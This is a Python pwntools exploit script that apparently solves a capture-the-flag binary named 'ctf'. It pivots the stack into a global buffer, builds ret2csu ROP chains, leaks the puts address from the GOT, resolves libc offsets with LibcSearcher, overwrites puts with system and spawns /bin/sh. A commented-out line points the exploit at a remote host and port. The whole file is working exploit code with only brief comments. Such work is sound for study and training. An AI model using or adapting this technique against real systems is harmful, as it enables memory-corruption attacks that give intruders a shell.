from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

elf = ELF('./ctf')
p = process('./ctf')
#p = remote('124.16.75.162', 31059)

leave_ret = 0x40090f
pivoted_stack = elf.sym['name_buf'] # 0x6010a0
binsh_addr = 1576 + elf.sym['name_buf']

rop = ROP(elf)
rop.raw(cyclic(8))
rop.ret2csu(edi=0, rsi=p64(elf.sym['name_buf']), rdx=0x800, call=elf.got['read'])

print(rop.dump())
p.recvuntil('>> ')
p.sendline('3')
p.recvuntil('Leave your Name: ')
p.send(rop.chain())


payload = cyclic(0x90) + p64(pivoted_stack) + p64(0x40090f)
p.recvuntil('>> ')
p.sendline('2')
p.recvuntil('Enter your size: ')
p.sendline(str(0xa0))
p.recvuntil('Enter your message: ')
p.send(payload)


p.recvuntil('>> ')
p.sendline('4')

rop.raw(p64(0x4005e6)*0xa0) # ret ret ret ...
rop(rdi=elf.got['puts'])
rop.call('puts')
rop.ret2csu(edi=0, rsi=p64(elf.got['puts']), rdx=0x8, call=elf.got['read'])
rop(rdi=p64(binsh_addr))
rop.call('puts')
print(len(rop.chain())) # binsh offset
rop.raw('/bin/sh\x00')

gdb.attach(p)
pause()
p.send(rop.chain())
pause()
p.send('x') # read modify rbx to -1, ret2csu cmp rbx+1 rbp fail, then it will entry read again


puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
success("puts addr: " + hex(puts_addr))
obj = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - obj.dump('puts')
system_addr = obj.dump('system') + libc_base
success('system: ' + hex(system_addr))


p.send(p64(system_addr))


p.interactive()
